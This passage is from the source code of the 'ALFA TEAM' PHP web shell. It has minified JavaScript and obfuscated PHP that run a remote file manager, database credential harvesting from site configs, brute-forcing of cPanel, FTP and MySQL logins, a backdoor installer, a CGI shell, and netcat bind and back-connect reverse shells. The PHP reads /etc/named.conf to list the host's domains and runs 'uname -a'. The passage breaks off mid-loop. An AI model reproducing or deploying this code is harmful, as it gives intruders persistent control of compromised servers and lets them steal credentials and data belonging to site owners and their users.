alfa1&&alfa1(e),alfaCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||alfaloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&alfaLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&alfaColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(alfaloader(alfa3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}alfaloader(t,"none")},!1,alfa3))}function alfaGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function alfaloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="alfaAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="alfateam-loader-text">ALFA TEAM</div><div class="alfa-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),alfaloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("query")+"&alfa2=&c="+alfab64(c_)+"&charset="+alfab64("UTF-8")+"&type="+alfab64(n)+"&sql_host="+alfab64(i)+"&sql_login="+alfab64(l)+"&sql_pass="+alfab64(o)+"&sql_base="+alfab64(r)+"&sql_count="+alfab64(s)+"&current_mysql_id="+alfab64(a)+"&ajax="+alfab64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),alfaloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function alfa_searcher_tool(e){switch(e){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function alfaAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".alfa-ajax-error").innerHTML=e+" ( "+t+firewall+" )",alfaShowNotification(t,"Ajax","error"))}}function alfaInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){alfaFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;alfaSortMenuItems(["newtab"]),alfaRightClickMenu(i,l),e.preventDefault()})})}function alfaRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function alfaSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function alfaAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=alfa_ace_editors.editor;"eval"==i&&(l=alfa_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("alfa_ace_"+a+"_"+i,t,2012)}function alfaAceChangeWrapMode(e,a){var t=alfa_ace_editors.editor;"eval"==a&&(t=alfa_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function alfaAceChangeFontSize(e,a,t){var i=alfa_ace_editors.editor;"eval"==e&&(i=alfa_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("alfa_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=alfa_ace_editors.editor&&null!=alfa_ace_editors.editor){for(var a in alfa_ace_editors.editor)alfa_ace_editors.editor[a].destroy();alfa_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=alfa_ace_editors.eval){for(var a in alfa_ace_editors.eval)alfa_ace_editors.eval[a].destroy();alfa_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("alfa_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return alfaSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=alfab64(t)),void 0!==l&&null!=l&&0!=l.length)n=alfab64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=alfab64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),alfaloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?alfaloader(b,"block"):(alfaloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+alfab64("FilesTools")+"&c="+alfab64(f)+"&alfa1="+alfab64(e)+"&alfa2="+alfab64(a)+"&alfa3="+r+"&alfa4="+n+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&alfaUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?alfaLoaderOnTop("none"):alfaloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&alfaShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&alfaShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),alfaLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function alfaLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("alfa-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="alfa-ace-plugin",t.onload=function(){alfaLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==alfa_ace_editors.editor&&(alfa_ace_editors.editor={});var i=getCookie("alfa_ace_theme_editor"),l=getCookie("alfa_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),alfa_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),alfa_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),alfa_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),alfa_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),alfa_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),alfa_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),alfa_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==alfa_ace_editors.eval&&(alfa_ace_editors.eval={});i=getCookie("alfa_ace_theme_eval"),l=getCookie("alfa_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),alfa_ace_editors.eval["phpeval-"+o]=ace.edit(t),alfa_ace_editors.eval["phpeval-"+o].setReadOnly(a),alfa_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),alfa_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),alfa_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),alfa_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[t].pwd)+"&arg="+alfab64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("alfa_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=alfa_ace_editors.editor[e].selection.toJSON();alfa_ace_editors.editor[e].selectAll(),alfa_ace_editors.editor[e].focus(),document.execCommand("copy"),alfa_ace_editors.editor[e].selection.fromJSON(a),alfaShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=alfab64(e,!0),a=alfab64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return alfab64(i,!0)}function reloadSetting(e){return alfaloader(alfa_before_do_action_id,"block"),_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&alfa9="+alfab64(e.cgi_api.value)+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),alfaloader(a,"none")},!1,alfa_before_do_action_id),alfa_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(a))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(t)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){evalJS(e)},!0)}function alfab64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __ALFA_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=alfa_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(e)+"&ajax="+alfab64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
</script>
<?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
<input type='hidden' name='a' value='dlfile'>
<input type='hidden' name='c' value=''>
<input type='hidden' name='file' value=''>
</form>
<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
<div id='a_loader'><img src='".__showicon('loader')."'></div>";
$onxerlrl397019bb489bdc576b45a3c04a24f7b8 = alfaEx("uname -a",false,false);
$ogfegecc4040592cec1880aa70936989f05e7c31 = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($onxerlrl397019bb489bdc576b45a3c04a24f7b8)>0?$onxerlrl397019bb489bdc576b45a3c04a24f7b8:'( php_uname ) Function Disabled !');
if($ogfegecc4040592cec1880aa70936989f05e7c31=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
echo '
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div id="up_bar_holder"></div>
<div class="whole">
<form method="post" name="mf" style="display:none;">
<input type="hidden" name="a">
<input type="hidden" name="c" value="'.$GLOBALS['cwd'].'">';
for($fwekvgvg03c7c0ace395d80182db07ae2c30f034=1;$fwekvgvg03c7c0ace395d80182db07ae2c30f034<=10;$fwekvgvg03c7c0ace395d80182db07ae2c30f034++){
echo '<input type="hidden" name="alfa'.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
<div class="header"><table width="100%" border="0">
<tr>
<td width="3%"><span class="header_vars">Uname:</span></td>
<td colspan="2"><span class="header_values" id="header_uname">'.$ogfegecc4040592cec1880aa70936989f05e7c31.'</span></td>
</tr>
<tr>
<td><span class="header_vars">User:</span></td>
<td><span class="header_values" id="header_userid">'. $uwdmfmmt9871d3a2c554b27151cacf1422eec048 . ' [ ' . $eeodyzriee11cbb19052e40b07aac0ca060c23ee . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c . ' [ ' . $btxspfltdb0f6f37ebeb6ea09489124345af2a45 . ' ]</span> </td>
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></td>
</tr>
<tr>
<td><span class="header_vars">PHP:</span></td>
<td><b>'.@phpversion(). ' </b><span class="header_vars"> Safe Mode: '.$dcwnlocgd27c87d911f030008cce9ab55024113f.'</span></td>
</tr>
<tr>
<td><span class="header_vars">ServerIP:</span></td>
<td><b>'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
</tr>
<tr>
<td width="3%"><span class="header_vars">DateTime:</span></td>
<td colspan="2"><b>'.date('Y-m-d H:i:s').'</b></td>
</tr>
<tr>
<td><span class="header_vars">Domains:</span></td>
<td width="76%"><span class="header_values" id="header_domains">';
if($GLOBALS['sys']=='unix'){
$tdhaoszb1b121fb6052882fa105bb281448bcad3 = _alfa_file("/etc/named.conf",false);
if(!$tdhaoszb1b121fb6052882fa105bb281448bcad3){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
$gstvxiofe2942a04780e223b215eb8b663cf5353=0;
foreach($tdhaoszb1b121fb6052882fa105bb281448bcad3 as $jgnscnwr19d85686df493bb25f5a6bfe5c0a7753){
if(@strstr($jgnscnwr19d85686df493bb25f5a6bfe5c0a7753,"zone")){
preg_match_all('#zone "(.*)"#', $jgnscnwr19d85686df493bb25f5a6bfe5c0a7753, $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3);
flush();
if(strlen(trim($jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3[1][0])) > 2){
flush();
$gstvxiofe2942a04780e223b215eb8b663cf5353++;}}}
